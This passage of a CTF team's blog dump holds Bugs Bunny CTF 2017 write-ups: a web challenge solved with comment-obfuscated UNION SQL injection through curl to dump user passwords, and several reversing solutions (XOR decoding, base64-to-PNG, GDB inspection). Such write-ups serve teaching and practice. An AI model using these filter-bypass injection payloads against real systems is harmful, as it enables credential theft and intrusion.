\"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/3,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; test&lt;/p&gt; &lt;/div&gt;....(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/4,1--\".... &lt;div class=\"login-help\"&gt; &lt;p&gt; &#125;&lt;/p&gt; &lt;/div&gt;.... With changing the limit we leaked all the passwords from the users as we can see the first user gave us an incomplete flag the others don’t seem to be part of the flag since there isn’t any “_” separating the words so lets assume our flag ends like “_Easy_I_Dont_Think}”.The rest of the flag must be in the username column! 123kinyabitch@Debian ~/D/H/ctf&gt; curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/username/**/from/**/users/**/limit/**/0,1--\"No way SOrry Fuck they are filtering the username too? wee need another technique to get the username field! Lets try to make the query always true! and then inject an union query: 1234567891011121314151617181920212223242526272829303132curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/0,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; Bugs_Bunny&#123;SQLi_Easy_!!&lt;/p&gt;&lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/1,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; a&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/2,1/**/--\"... &lt;div class=\"login-help\"&gt; &lt;p&gt; flag_is&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/3,1/**/--\"... &lt;div class=\"login-help\"&gt; &lt;p&gt; hello&lt;/p&gt; &lt;/div&gt;...curl \"http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\\\"a\\\"/**/limit/**/4,1/**/--\"...&lt;div class=\"login-help\"&gt; &lt;p&gt; so_2017!&lt;/p&gt;&lt;/div&gt;... The flag is the combination of the some of this strings after some trial and error trying to login I could see that the login table is: 12345678Usersid username password1 hello hello2 flag_is here 3 Bugs_Bunny&#123;SQLi_Easy_!! _Easy_I_Dont_Think4 so_2017! &#125; 5 test test So the flag is Bugs_Bunny{SQLi_Easy_!!_Easy_I_Dont_Thinkso_2017!}","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"filterbypass","slug":"filterbypass","permalink":"https://teamrocketist.github.io/tags/filterbypass/"}]},{"title":"[Reverse] BugsBunny CTF - Rev75","slug":"Reverse-BugsBunny-CTF-Rev75","date":"2017-08-01T08:03:50.000Z","updated":"2018-10-24T23:21:04.830Z","comments":true,"path":"2017/08/01/Reverse-BugsBunny-CTF-Rev75/","link":"","permalink":"https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/","excerpt":"","text":"rev100100Find me faster !Author: Aymen Borgi At first by checking the main function we can observe that it leads us to nowhere either gives us the strings “bad password” or “good but no flag for you hihihi xD” if we gave the right password which could be found simply by debugging and break points. Now the flag must be in another functions there is alot starting from a0 to a814 By checking one of them we can see it contains a string that looks like they are encoded by base64 My plan was to copy all disassembled code from this functions and then use regex to get all the strings between quotes and concatenate them. After that I decoded the string and got a png image with the flag! here is the script: 12345strings = \"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Y2jUqFHh97//fUZvq7q6OkyfPj389a9/DXPmzAnLli0LGzduDJWVlR4BhCYal9AUnVFUVBRKSkpCq1atQseOHUOfPn3CueeeGy688MJQXJyZV+8JwP9Od9FFF4Xx48eHfffdN28OlPr+6qVpj6EePXqEf/7zn8lHd7H33Ykbm4U/Lu1zY2dP7IzG2KOfAp4/f36YMWNGePXVV8PixYvD6tWrw6pVq0JVVVUoKysLXbt2DSeddFL4zne+E3r37u1elXo1a9YsdOzYMQwdOjTceuut4g+MSyjoznAZGH8pgbFpbNrn9rntuLftOwEIALB3cR1AAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAANoEAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAACy5v8BjDWwa4oYZqgAAAAASUVORK5CYII=\"fh = open(\"flag.png\", \"wb\")fh.write(base64.b64decode(strings))fh.close() And now the flag","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"base64","slug":"base64","permalink":"https://teamrocketist.github.io/tags/base64/"}]},{"title":"[Reverse] Bugs Bunny CTF - Rev100","slug":"Reverse-Bugs-Bunny-CTF-Rev100","date":"2017-07-31T15:14:17.000Z","updated":"2018-10-24T23:21:04.830Z","comments":true,"path":"2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/","excerpt":"","text":"Find me faster !Author: Aymen Borgirev100.zipStarting to open our executable file on IDA:There is some weird shit going around but we can see a function i_am_debugged() which leads you to exit the program if you running the program on a debugger like gdb or even IDA, there is alot of calls as you can see in the assembly code I could run the debugger and change those registers to not jump out of the program but since there was alot of calls I chose to do it in another way.After a while I found this “loop” in the assembly code we can see they are just xoring two strange strings, variable “a” and variable “b” and then saving it on variable “c”.Now we just need to find those “a” and “b” initial values and convert this assembly into python.Finding “a” and “b” values is easy we can use IDA to do that:Now we just write a python script equivalent to this assembly (Notice that wrote the strings in python as hex bytes because some characters weren’t pritable): 12345678910a = '\\x61\\x41\\x40\\x37\\x6d\\x77\\x34\\x2c\\x5f\\x41\\x42\\x60\\x07\\x34\\x7d\\x12\\x57\\x7a\\x22\\x25\\x4f\\x28'b = '\\x23\\x34\\x27\\x44\\x32\\x35\\x41\\x42\\x31\\x38\\x39\\x38\\x37\\x46\\x22\\x23\\x24\\x25\\x44\\x50\\x21\\x55' c = ''v4 = len(a) + 1v5 = len(b) + 1for i in range(0, v4-1): c += chr(ord(a[i])^ord(b[i])) print cprint c Running the script: 123kinyabitch@Debian ~/D/H/ctf&gt; python rev100.py Bugs_Bunny&#123;X0r_1s_fun&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"}]},{"title":"[Reverse] - Bugs Bunny CTF - Rev 50","slug":"Reverse-Bugs-Bunny-CTF-Rev-50","date":"2017-07-31T14:16:03.000Z","updated":"2018-10-24T23:21:04.830Z","comments":true,"path":"2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/","excerpt":"","text":"only guess50Reverse Engineering … ooh no need !put the right password between Bugs_Bunny{…}Author: Aymen Borgi Starting by Executing the file: 123kinyabitch@Debian ~/D/H/ctf&gt; rev50/rev50usage ./rev50 password Using the ida pro to check all the strings in the program we can see there were alot of them so we can’t really guess which one is it without analysing the program itself Checking out the main function with ida pro we can see: We now can see where our program is checking if the flag is correct if we manage to check value of the register RAX register before that strcmp ocurrs. I could use IDA to check those values but since is alot of trouble to do remote execute the file in a linux machine (I was executing ida in a windows VM machine) to not loose time I rather preferred to check the value on GDB: Disassembling the main functionIdentify the address and do a break point and checking the value on the register RAXRerunning the program with the password “mercedes”Finally our flag is BugsBunny{mercedes}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"gdb","slug":"gdb","permalink":"https://teamrocketist.github.io/tags/gdb/"}]},{"title":"[Web] Bugs Bunny Ctf - Web 100","slug":"Web-Bugs-Bunny-Ctf-Web-100","date":"2017-07-31T10:50:11.000Z","updated":"2018-10-24T23:21:04.830Z","comments":true,"path":"2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/","excerpt":"","text":"Web100100My secure system is secure even you have my codehttp://52.53.151.123/web/web100.html This one was fairly easy the first thing that showed up on the web page was a http auth which was asking for a password my first thought was to bruteforce the password but first I checked up the website executing the command curl with bash: 12curl 'http://52.53.151.123/web/web100.html' And then showed up some javascript code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210var generate = function(string) &#123; function RT(lValue, iShiftBits) &#123; return (lValue &lt;&lt; iShiftBits) | (lValue &gt;&gt;&gt; (32 - iShiftBits)); &#125; function AU(lX, lY) &#123; var lX4, lY4, lX8, lY8, lResult; lX8 = (lX &amp; 0x80000000); lY8 = (lY &amp; 0x80000000); lX4 = (lX &amp; 0x40000000); lY4 = (lY &amp; 0x40000000); lResult = (lX &amp; 0x3FFFFFFF) + (lY &amp; 0x3FFFFFFF); if (lX4 &amp; lY4) &#123; return (lResult ^ 0x80000000 ^ lX8 ^ lY8); &#125; if (lX4 | lY4) &#123; if (lResult &amp; 0x40000000) &#123; return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); &#125; else &#123; return (lResult ^ 0x40000000 ^ lX8 ^ lY8); &#125; &#125; else &#123; return (lResult ^ lX8 ^ lY8); &#125; &#125; function F(x, y, z) &#123; return (x &amp; y) | ((~x) &amp; z); &#125; function G(x, y, z) &#123; return (x &amp; z) | (y &amp; (~z)); &#125; function H(x, y, z) &#123; return (x ^ y ^ z); &#125; function I(x, y, z) &#123; return (y ^ (x | (~z))); &#125; function FF(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(F(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function GG(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(G(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function HH(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(H(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function II(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(I(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function CTWA(bytes) &#123; var lWordCount; var lMessageLength = bytes.length; var lNumberOfWords_temp1 = lMessageLength + 8; var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64; var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16; var lWordArray = Array(lNumberOfWords - 1); var lBytePosition = 0; var lByteCount = 0; while (lByteCount &lt; lMessageLength) &#123; lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (bytes[lByteCount] &lt;&lt; lBytePosition)); lByteCount++; &#125; lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 &lt;&lt; lBytePosition); lWordArray[lNumberOfWords - 2] = lMessageLength &lt;&lt; 3; lWordArray[lNumberOfWords - 1] = lMessageLength &gt;&gt;&gt; 29; return lWordArray; &#125;; function WordToHex(lValue) &#123; var WordToHexValue = \"\", WordToHexValue_temp = \"\", lByte, lCount; for (lCount = 0; lCount &lt;= 3; lCount++) &#123; lByte = (lValue &gt;&gt;&gt; (lCount * 8)) &amp; 255; WordToHexValue_temp = \"0\" + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2); &#125; return WordToHexValue; &#125;; function Utf8Encode(string) &#123; string = string.replace(/\\r\\n/g, \"\\n\"); var result = Array(); for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; result.push(c); &#125; else if ((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; result.push((c &gt;&gt; 6) | 192); result.push((c 